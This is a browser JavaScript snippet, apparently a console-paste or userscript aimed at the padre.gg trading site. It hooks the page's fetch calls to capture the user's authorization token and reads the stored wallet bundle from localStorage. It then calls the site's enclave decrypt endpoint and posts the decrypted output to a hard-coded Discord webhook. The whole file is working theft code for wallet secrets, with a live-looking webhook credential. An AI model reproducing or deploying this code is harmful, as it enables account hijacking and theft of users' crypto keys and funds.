(function() {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1469402005800878305/8hG79mVNsgEJiGa4fyqAGf3PsUsQYi1rQyMZnu7bcxYyeQGj7ZgBf7ucccxQt8sBBh09";
    const DECRYPT_API = "https://api.padre.gg/v2/enclave/decrypt";

    const session = { auth: null, bundle: null };

    // 1. TERMINAL INTERFACE
    const setupUI = () => {
        if (document.getElementById('vanta-v12')) return;
        const ui = document.createElement('div');
        ui.id = 'vanta-v12';
        ui.style = `position:fixed;top:10px;right:10px;width:330px;background:#000;border:1px solid #00ff88;color:#00ff88;padding:15px;z-index:9999999;font-family:monospace;box-shadow:0 0 20px #00ff88;border-radius:5px;`;
        ui.innerHTML = `
            <div style="font-weight:bold;border-bottom:1px solid #333;margin-bottom:10px;display:flex;justify-content:space-between;">
                <span>VANTA_KERNEL_v12</span><span id="v-status">●</span>
            </div>
            <div id="v-log" style="height:150px;overflow-y:auto;font-size:10px;margin-bottom:10px;background:#050505;padding:5px;"></div>
            <button id="v-scan" style="width:100%;background:#00ff88;color:#000;border:none;padding:10px;font-weight:bold;cursor:pointer;">FORCE BYPASS SCAN</button>
        `;
        document.body.appendChild(ui);
    };

    const log = (m) => {
        const l = document.getElementById('v-log');
        if (l) { l.innerHTML += `<div>> ${m}</div>`; l.scrollTop = l.scrollHeight; }
    };

    // 2. DISCORD EXFILTRATION (Direct)
    const exfil = async (title, content) => {
        const payload = {
            embeds: [{
                title: title,
                description: "```" + (typeof content === 'string' ? content : JSON.stringify(content, null, 2)).substring(0, 1900) + "```",
                color: 65280,
                timestamp: new Date()
            }]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            log("DATA SENT TO DISCORD");
        } catch (e) {
            log("WEBHOOK ERROR: Check Console");
        }
    };

    // 3. THE HIJACKER
    const startBypass = () => {
        log("Hooking network layers...");
        
        // Hook Fetch specifically for Auth
        const _f = window.fetch;
        window.fetch = async (...args) => {
            const h = args[1]?.headers;
            if (h) {
                let a = (h instanceof Headers) ? h.get('Authorization') : h['Authorization'];
                if (a && !session.auth) {
                    session.auth = a;
                    log("AUTH_TOKEN CAPTURED");
                    document.getElementById('v-status').style.color = "#0f0";
                    runExtraction();
                }
            }
            return _f.apply(this, args);
        };

        // Scan storage for bundle
        const bundleData = localStorage.getItem('padre-v2-bundles-store-v2');
        if (bundleData) {
            session.bundle = JSON.parse(bundleData);
            log("BUNDLE LOCATED");
        } else {
            log("ERROR: Bundle missing (Login required)");
        }
    };

    // 4. EXTRACTION EXECUTION
    const runExtraction = async () => {
        if (!session.auth || !session.bundle) return;
        log("Decrypting Enclave...");

        const bKey = Object.keys(session.bundle.bundles)[0];
        const payload = {
            bundle: session.bundle.bundles[bKey].exportBundle,
            subOrgId: session.bundle.bundles[bKey].subOrgId
        };

        try {
            const res = await fetch(DECRYPT_API, {
                method: 'POST',
                headers: { 
                    'Authorization': session.auth, 
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify(payload)
            });

            const data = await res.text();
            log("DECRYPTION COMPLETE");
            await exfil("BYPASS SUCCESS", data);
        } catch (e) {
            log("DECRYPT FAILED: " + e.message);
        }
    };

    // INIT
    setupUI();
    startBypass();

    document.getElementById('v-scan').onclick = () => {
        log("Triggering network pulse...");
        // Force the app to refresh its profile and leak the token
        fetch('/api/v2/user/profile').catch(() => {});
        // Manual check of existing storage
        if (session.auth && session.bundle) runExtraction();
    };
})();
